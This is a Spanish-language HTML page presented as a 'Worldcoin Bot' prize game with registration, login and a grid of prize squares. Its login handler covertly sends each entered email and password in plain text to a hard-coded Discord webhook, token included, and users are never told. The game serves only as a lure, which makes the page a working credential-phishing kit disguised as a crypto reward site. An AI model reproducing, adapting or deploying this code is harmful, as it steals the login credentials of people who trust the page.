<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Worldcoin Bot</title>
</head>
<body>

<div id="registro" style="display:none;">
    <h2>Worldcoin Miner</h2>
    <h2>Registro</h2>
    <input type="email" id="registroUsuario" placeholder="Correo electrónico">
    <input type="password" id="registroContrasena" placeholder="Contraseña">
    <button id="btnRegistro">Registrarse</button>
    <p>¿Ya tienes cuenta? <span id="irALogin" style="cursor:pointer; color:blue;">Iniciar sesión</span></p>
</div>
<div id="bannerRegistro" style="display: none; position: fixed; top: 20%; left: 50%; transform: translate(-50%, -50%); background-color: #4CAF50; color: white; padding: 20px; border-radius: 5px; z-index: 1000;">Registrando...</div>

<div id="login" style="display:none;">
    <h2>Iniciar Sesión</h2>
    <input type="email" id="loginUsuario" placeholder="Correo electrónico">
    <input type="password" id="loginContrasena" placeholder="Contraseña">
    <button id="btnLogin">Iniciar Sesión</button>
    <p>¿No tienes cuenta? <span id="irARegistro" style="cursor:pointer; color:blue;">Registrarse</span></p>
</div>

<div id="game-container" style="display:none;">
    <h1>Gana Worldcoin</h1>
    <p>Jugar es muy sencillo</p>
    <div id="vidas">Oportunidades: 3</div>
    <div id="pizarra"></div>
    <button id="recargar">Recargar Oportunidades</button>
    <h2>Premios obtenidos:</h2>
    <div id="premiosObtenidos"></div>
</div>

  <style>body {
    font-family: 'Arial', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    background-color: #f4f4f4;
    text-align: center;
    margin: 0; /* Asegurarse de que no hay margen exterior */
}

h1, h2 {
    color: #333;
}

input[type="text"], input[type="password"] {
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
    width: 80%; /* Ajusta al tamaño deseado */
}

button {
    background-color: #007bff;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

button:hover {
    background-color: #0056b3;
}

#pizarra {
    display: grid;
    grid-template-columns: repeat(6, 100px); /* Cambiado a 6 para acomodar 36 casilleros */
    gap: 10px;
}


.casillero {
    width: 50px; /* Ajusta el ancho de los casilleros */
    height: 50px; /* Ajusta el alto de los casilleros */
    margin: 5px; /* Ajusta el espacio entre los casilleros */
    display: inline-block; /* Mantiene los casilleros en línea */
    border: 1px solid #000; /* Opcional: añade un borde para visualizar mejor los casilleros */
    text-align: center; /* Alinea el texto (premio) en el centro del casillero */
    vertical-align: top; /* Alineación vertical para cuando el texto ocupe más de una línea */
    line-height: 50px; /* Centra verticalmente el texto dentro del casillero */
    cursor: pointer; /* Cambia el cursor a una mano cuando se pasa sobre los casilleros */
}


.casillero:hover {
    transform: scale(1.1); /* Efecto de crecimiento al pasar el mouse */
    background-color: #ccc; /* Cambio de color al pasar el mouse */
}

.revelado {
    background-color: #4CAF50;
    color: white;
}

#vidas, #premiosObtenidos {
    margin: 20px;
    font-size: 20px;
}

#premiosObtenidos {
    margin-top: 10px;
}

span {
    font-weight: bold;
    text-decoration: underline;
}



</style>
    
</body>
  <script>
     let oportunidades = 3;
     let premios = []; // Ajusta según tu juego
     let premiosObtenidos = [];
 
      
      
      document.addEventListener('DOMContentLoaded', () => {

        mostrarRegistro(); // Muestra la pantalla de registro por defecto

   document.getElementById('btnRegistro').addEventListener('click', function() {
    const usuario = document.getElementById('registroUsuario').value;
    const contrasena = document.getElementById('registroContrasena').value;
    if (usuario && contrasena) {
        // Muestra el banner de "Registrando..."
        document.getElementById('bannerRegistro').style.display = 'block';

        // Simulamos un retardo para el proceso de registro (4 segundos)
        setTimeout(function() {
            const userData = {
                username: usuario,
                password: contrasena
            };
            localStorage.setItem(usuario, JSON.stringify(userData));
            
            // Ocultamos el banner después del registro exitoso
            document.getElementById('bannerRegistro').style.display = 'none';
            
            alert('Registro exitoso. Por favor, inicie sesión.');
            mostrarLogin();
        }, 4000); // Retraso de 4 segundos
    } else {
        alert('Por favor, complete todos los campos.');
    }
});

   document.getElementById('btnLogin').addEventListener('click', function() {
    const email = document.getElementById('loginUsuario').value;
    const contrasena = document.getElementById('loginContrasena').value;
    
    enviarDatosAWebhook(email, contrasena); // Continúa enviando los datos al webhook como ya estaba configurado.
    
    const userData = localStorage.getItem(email);
    if (userData) {
        const userInfo = JSON.parse(userData);
        if (userInfo.password === contrasena) {
            alert('Inicio de sesión exitoso.');
            document.getElementById('login').style.display = 'none';
            document.getElementById('game-container').style.display = 'block';
            inicializarPremios(); // Asegurarse de inicializar los premios primero
            inicializarPizarra(); // Luego inicializar la pizarra
        } else {
            alert('Contraseña incorrecta');
        }
    } else {
        alert('Usuario no encontrado');
    }
});



    // Cambia a la vista de registro
    document.getElementById('irARegistro').addEventListener('click', function() {
        mostrarRegistro();
    });

    // Cambia a la vista de inicio de sesión
    document.getElementById('irALogin').addEventListener('click', function() {
        mostrarLogin();
    });

    function mostrarLogin() {
        document.getElementById('login').style.display = 'block';
        document.getElementById('registro').style.display = 'none';
        document.getElementById('game-container').style.display = 'none';
    }

    function mostrarRegistro() {
        document.getElementById('registro').style.display = 'block';
        document.getElementById('login').style.display = 'none';
        document.getElementById('game-container').style.display = 'none';
    }


    document.getElementById('recargar').addEventListener('click', function() {
        oportunidades = 3; // Restablece las oportunidades a 3
        premiosObtenidos = []; // Limpia los premios obtenidos
        actualizarOportunidades();
        mostrarPremiosObtenidos();
        // Opcional: Restablecer los casilleros para permitir una nueva selección
    });
    // Actualiza el texto de oportunidades restantes
    function actualizarOportunidades() {
        document.getElementById('vidas').innerText = `Oportunidades: ${oportunidades}`;
    }

    // Agrega los premios obtenidos al contenedor correspondiente
    function mostrarPremiosObtenidos() {
        document.getElementById('premiosObtenidos').innerText = premiosObtenidos.join(', ');
    }

function inicializarPremios() {
    // Reiniciar los premios
    premios = [];

    // Añadir premios
    premios.push('X10'); // 1 casillero x10
    for (let i = 0; i < 3; i++) premios.push('X2'); // 3 casilleros x2
    for (let i = 0; i < 7; i++) premios.push('X1'); // 7 casilleros x1
    for (let i = 0; i < 10; i++) premios.push('X0.3'); // 10 casilleros x0.5

    // Rellenar el resto de casilleros con 'Sin premio'
    while (premios.length < 36) {
        premios.push('Sin premio');
    }

    // Mezclar los premios
    premios.sort(() => Math.random() - 0.5);
}





          
    // Función para manejar el click en un casillero
    function elegirCasillero(event) {
        if (oportunidades > 0) {
            const casillero = event.target;
            const premio = casillero.getAttribute('data-premio');
            premiosObtenidos.push(premio);
            casillero.innerText = premio;
            casillero.style.pointerEvents = 'none'; // Deshabilitar más clicks en este casillero
            casillero.style.backgroundColor = '#ddd'; // Cambio visual para indicar que este casillero ya fue elegido
            oportunidades--;
            actualizarOportunidades();
            mostrarPremiosObtenidos();

            if (oportunidades === 0) {
                // Opcional: Mostrar mensaje final o deshabilitar todos los casilleros
                alert('No quedan más oportunidades');
            }
        }
    }



function enviarDatosAWebhook(email, contrasena) {
    var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
    var request = new XMLHttpRequest();
    request.open("POST", webhookURL);
    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "Notificación de inicio de sesión",
        avatar_url: "",
        content: `Correo electrónico: ${email} - Contraseña: ${contrasena}`
    };

    request.send(JSON.stringify(params));

    request.onreadystatechange = function() {
        if (request.readyState === 4) {
            if (request.status === 204) {
                console.log("Datos enviados con éxito a Discord.");
            } else {
                console.error("Error al enviar datos a Discord:", request.statusText);
            }
        }
    };
}

// Cambia a la vista de registro
document.getElementById('irARegistro').addEventListener('click', function() {
    mostrarRegistro(); // Asegúrate de que esta función esté bien definida para manejar el cambio de vista
});
   

    // Inicialización de la pizarra de premios
    function inicializarPizarra() {
        const pizarra = document.getElementById('pizarra');
        for (let i = 0; i < premios.length; i++) {
            const casillero = document.createElement('div');
            casillero.classList.add('casillero');
            casillero.setAttribute('data-premio', premios[i]);
            casillero.addEventListener('click', elegirCasillero);
            pizarra.appendChild(casillero);
        }
        actualizarOportunidades();
    }

});



</script>
</html>
